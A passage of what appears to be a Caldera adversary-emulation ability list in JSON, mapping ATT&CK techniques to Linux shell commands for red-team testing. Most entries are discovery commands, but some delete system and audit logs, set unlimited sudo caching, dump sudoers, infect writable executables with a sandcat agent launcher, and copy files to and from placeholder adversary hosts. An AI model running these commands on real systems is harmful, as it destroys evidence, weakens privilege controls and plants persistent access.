        "ability_id": "c668e2597e8c0ebf1709f85d253995ab",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "users; w; who",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "System Owner/User Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4370001012f5f0df001269627b4737e9",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Time Discovery in macOS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "eaf91088bebfec0863a94bbee470f9f2",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System log file deletion via find utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7736f529851c0c391f598cdeddb5d787",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "Identify system processes",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps aux",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "System processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Testing uncommonly used port utilizing telnet.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Non-Standard Port",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo quit | telnet google.com 8081; exit 0",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Testing usage of uncommonly used port",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "bd6226bd86cbcd3e083f997194d66372",
        "technique_id": "T1571",
        "repeatable": false
    },
    {
        "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Multi-hop Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Tor Proxy Usage - MacOS",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "8c88994e55a53a5f85b75ecded495ab0",
        "technique_id": "T1090.003",
        "repeatable": false
    },
    {
        "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Trap",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f /tmp/art-fish.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Trap EXIT",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7e2dc6c4605119184437dbc8cdb80265",
        "technique_id": "T1546.005",
        "repeatable": false
    },
    {
        "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Trap",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f /tmp/art-fish.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Trap SIGINT",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "97eb1eb07611c5f98768250b1b705a67",
        "technique_id": "T1546.005",
        "repeatable": false
    },
    {
        "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Truncate system log files via truncate utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "68c56ff768d196958e92ebbcb91bc759",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "find attached usb devices",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "USB Connected Device Discovery",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe",
        "technique_id": "T1120",
        "repeatable": false
    },
    {
        "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers; sudo visudo -c -f /etc/sudoers",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Unlimited sudo cache timeout",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f1debf348737a5744911d71cec0ca4ea",
        "technique_id": "T1548.003",
        "repeatable": false
    },
    {
        "description": "Using a space before a command causes the command to not be logged in the Bash History file\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "hostname; whoami",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Use Space Before Command to Avoid Logging to History",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8e7c28877a9c7826fece190f185b534c",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Display information about current system processes",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "View Processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "View accounts with UID 0\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f /tmp/T1087.001.txt 2>/dev/null"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "View accounts with UID 0",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "59703a9c143cdc58377b103a1c7acc59",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "View details of queued documents in printer queue",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "lpq -a",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.printer_queue",
                        "parserconfigs": [
                            {
                                "edge": "has_size",
                                "source": "host.print.file",
                                "custom_parser_vals": {},
                                "target": "host.print.size"
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "View printer queue",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "6c91884e-11ec-422f-a6ed-e76774b0daac",
        "technique_id": "T1120",
        "repeatable": false
    },
    {
        "description": "(requires root)\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -f /tmp/T1087.001.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "View sudoers access",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ff603d97a57715d3c2a1de941419d661",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Locate and infect files with weak but executable perms",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services File Permissions Weakness",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "sandcat.go"
                ],
                "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Weak executable files",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "10681f2f-be03-44af-858d-f2b0812df185",
        "technique_id": "T1574.010",
        "repeatable": false
    },
    {
        "description": "See the raw content of a socket",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl #{remote.host.socket}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "cURL socket address",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "89955f55-529d-4d58-bed4-fed9e42515ec",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chattr -i /var/spool/cron/root",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chattr - Remove immutable file attribute",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6030515771f31561f2b87d5832743888",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chmod - Change file or folder mode (numeric mode)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b5d829c249e3577bebb081b82cb4edcf",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chmod - Change file or folder mode (numeric mode) recursively",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f7de34810a85331e65c656023acb549b",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chmod - Change file or folder mode (symbolic mode)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "26ed797080bee3874bb18301a88f1be9",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chmod - Change file or folder mode (symbolic mode) recursively",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "27b1c45ca84b25f3b97e298a7f2ca9c3",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's ownership only using chown.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chown - Change file or folder mode ownership only",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "689b764ccd17d8c4b587ce1a6f73cd65",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's ownership and group information using chown.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chown",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chown - Change file or folder ownership and group",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "560a1774602fdd048fe593bf31052ef4",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's ownership and group information recursively using chown.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chown -R",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chown - Change file or folder ownership and group recursively",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "12ba4650b2b42fb4b58989faacc03061",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Changes a file or folder's ownership only recursively using chown.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "chown - Change file or folder ownership recursively",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "791086a91572971cf5462ebdb2c82007",
        "technique_id": "T1222.002",
        "repeatable": false
    },
    {
        "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Destruction",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "macOS/Linux - Overwrite file with DD",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "2cc4d863d4b7c634e8b6add14cf8c7a4",
        "technique_id": "T1485",
        "repeatable": false
    },
    {
        "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "yes > /dev/null",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "macOS/Linux - Simulate CPU Load with Yes",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "5f407c31b29d92be4648b3cff37e0abe",
        "technique_id": "T1496",
        "repeatable": false
    },
    {
        "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "rc.common",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ab44803d5a9c299258efff185b0f70b5",
        "technique_id": "T1037.004",
        "repeatable": false
    },
    {
        "description": "Delete system and audit logs\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "rm -rf",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "0e0bf52a7d3c64d3b9c8a6106bf92926",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "Utilize rsync to perform a remote file copy (pull)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "rsync remote file copy (pull)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "50a319ee67cdb786e6207194c8d61c72",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Utilize rsync to perform a remote file copy (push)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "rsync remote file copy (push)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "866227c57aaeb1e0e9d761e15fc29e44",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Utilize scp to perform a remote file copy (pull)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "scp remote file copy (pull)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "f4e6b028e9c60c515541d52921fa2b48",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Utilize scp to perform a remote file copy (push)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "scp remote file copy (push)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "2f872c3c1107218205093c16a8cb6d66",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Utilize sftp to perform a remote file copy (pull)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "sftp remote file copy (pull)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "2443f86c5b3067f3c3fda59384c566b6",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Utilize sftp to perform a remote file copy (push)\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "sftp remote file copy (push)",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "806814854866002bd861b76b7a2ee2c9",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Audio Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "using Quicktime Player",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "e8553d5d1077db444ab2bf2938b5fc5b",
        "technique_id": "T1123",
        "repeatable": false
    },
    {
        "description": "Download a remote file using the whois utility\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
